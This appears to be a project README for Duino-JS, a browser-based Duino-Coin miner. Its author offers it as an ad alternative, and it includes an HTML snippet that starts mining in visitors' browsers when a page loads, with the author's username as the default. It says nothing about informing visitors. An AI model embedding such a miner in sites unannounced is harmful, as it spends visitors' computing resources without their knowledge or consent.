## Why
I am developing my own site since a few months, and I wanted to make some money of it, but because you have to give a credit card number and your address to the ad provider (usually Google), I searched for alternatives.

I then found out that you can let your viewers mine crypto coins, so I did some research, but found only 3 results:
- Coinhive, but it was discontinued in 2017.
- Minero.cc, but you could only use their wallet.
- CoinIMP, but I couldn't really make a good profit of it.

So I stopped searching...

----

28-05-2021: I stumbled across [this video on YouTube](https://www.youtube.com/watch?v=CbpfNU7oaws "Solar Powered Crypto Miner Using A Raspberry Pi"), 
there were some comments about Duino-Coin, so I decided to take a look at their website.

I found out that I could mine crypto on my arduino's, and that there were some projects 
which could let you mine on your computer, but written in [Go](https://github.com/yippiez/go-miner) or [C](https://github.com/phantom32-0/d-cpuminer). I tried to compile those to WebAssembly, but that 
didn't work, so I decided to write one myself in JavaScript, to use on my future website, or yours...

## Features
- A LOT of comments, and if you want to, it can console.log() everything it sends or receives from the server.
- Connects to the WebSocket server via a secured protocol (WSS).
- The username to mine to can be changed easily, just like the rigid (how the miner appears in the wallet).
- Runs in a Web Worker, so the performance of your site won't be interrupted.

## Usage
To use the miner, download (https://github.com/Hoiboy19/Duino-JS/releases/latest)[the duino-js folder from the latest release], place the duino-js folder in the root of your site and add this to the end of your html:
```html
<script src="/duino-js/duino-js.min.js"></script> <!--imports the Duino-JS miner-->
<script>
    var username = "Hoiboy19"; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
    var rigid = "Duino-JS"; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
    startMiner(); //starts the miner
</script>
```

## License
This project is licensed under [the MIT license](https://en.wikipedia.org/wiki/MIT_License), so you can use it in whatever you want, even commercial projects. You only have to credit me with Hoiboy19.
